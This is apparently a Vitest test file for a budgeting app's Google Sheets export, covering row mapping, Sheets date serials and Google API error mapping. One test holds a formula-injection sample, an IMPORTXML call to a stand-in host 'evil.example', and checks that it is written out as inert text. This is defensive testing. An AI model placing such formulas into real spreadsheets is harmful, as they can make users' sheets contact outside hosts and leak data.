import { describe, it, expect } from 'vitest';
import { SHEET_HEADER, toSheetTable, toSheetsDateSerial, type ExportTransaction } from '../../services/googleSheets/sheetRows';
import { mapGoogleError } from '../../services/googleSheets/adapters/google.adapter';
import {
  GoogleReauthRequiredError,
  GoogleUnavailableError,
  SheetNotAccessibleError
} from '../../errors/GoogleErrors';

const tx = (over: Partial<ExportTransaction> = {}): ExportTransaction => ({
  id: 'tx-1',
  date: new Date('2026-09-18T15:30:00Z'),
  type: 'expense',
  amountCents: 520129,
  vendor: 'Pemex',
  description: 'Gas',
  account: { name: 'BBVA Débito', currency: 'MXN' },
  budget: { year: 2026, month: 8 },
  incomeItem: null,
  expenseItem: { description: 'Gas for Car' },
  ...over
});

describe('toSheetTable', () => {
  it('maps a transaction to one literal row', () => {
    const table = toSheetTable([tx()]);
    expect(table.header).toEqual(SHEET_HEADER);
    expect(table.rows).toEqual([[
      toSheetsDateSerial(new Date('2026-09-18T00:00:00Z')),
      'Gasto',
      5201.29, // exact, from cents
      'MXN',
      'Pemex',
      'Gas',
      'BBVA Débito',
      '2026-09', // month stored 0-based
      'Gas for Car',
      'tx-1'
    ]]);
    expect(table.dateColumns).toEqual([0]);
    expect(table.moneyColumns).toEqual([2]);
  });

  it('keeps formula-looking text verbatim (the adapter writes RAW, so it never executes)', () => {
    const [row] = toSheetTable([tx({ vendor: '=IMPORTXML("http://evil.example","//a")', description: '+cmd' })]).rows;
    expect(row?.[4]).toBe('=IMPORTXML("http://evil.example","//a")');
    expect(row?.[5]).toBe('+cmd');
  });

  it('handles missing relations and income rows', () => {
    const [row] = toSheetTable([tx({ type: 'income', account: null, budget: null, expenseItem: null, incomeItem: { description: 'Salary' }, description: null })]).rows;
    expect(row?.[1]).toBe('Ingreso');
    expect(row?.slice(3, 9)).toEqual(['', 'Pemex', '', '', '', 'Salary']);
  });

  it('computes Sheets date serials (1899-12-30 epoch, UTC day)', () => {
    expect(toSheetsDateSerial(new Date('1899-12-31T00:00:00Z'))).toBe(1);
    expect(toSheetsDateSerial(new Date('2026-01-01T23:59:59Z'))).toBe(46023);
  });
});

describe('mapGoogleError', () => {
  it('invalid_grant / 401 → reauth required', () => {
    expect(mapGoogleError({ message: 'invalid_grant' }, false)).toBeInstanceOf(GoogleReauthRequiredError);
    expect(mapGoogleError({ status: 401 }, true)).toBeInstanceOf(GoogleReauthRequiredError);
  });

  it('403 for missing scopes → reauth required', () => {
    const err = { status: 403, response: { status: 403, data: { error: { status: 'PERMISSION_DENIED', details: [{ reason: 'ACCESS_TOKEN_SCOPE_INSUFFICIENT' }] } } } };
    expect(mapGoogleError(err, true)).toBeInstanceOf(GoogleReauthRequiredError);
  });

  it('404/403 on a spreadsheet → sheet not accessible', () => {
    expect(mapGoogleError({ status: 404 }, true)).toBeInstanceOf(SheetNotAccessibleError);
    expect(mapGoogleError({ response: { status: 403 } }, true)).toBeInstanceOf(SheetNotAccessibleError);
  });

  it('429, 5xx, timeouts and network errors → unavailable', () => {
    for (const e of [{ status: 429 }, { status: 503 }, { code: 'ETIMEDOUT' }, { name: 'AbortError' }]) {
      expect(mapGoogleError(e, true)).toBeInstanceOf(GoogleUnavailableError);
    }
  });

  it('anything else is passed through (→ 500, hidden by the errorHandler)', () => {
    const original = new Error('weird');
    expect(mapGoogleError(original, false)).toBe(original);
  });

  it('none of the mapped errors use 401 (that would log the user out of the app)', () => {
    for (const e of [{ status: 401 }, { status: 404 }, { status: 503 }]) {
      expect((mapGoogleError(e, true) as Error & { statusCode: number }).statusCode).not.toBe(401);
    }
  });
});
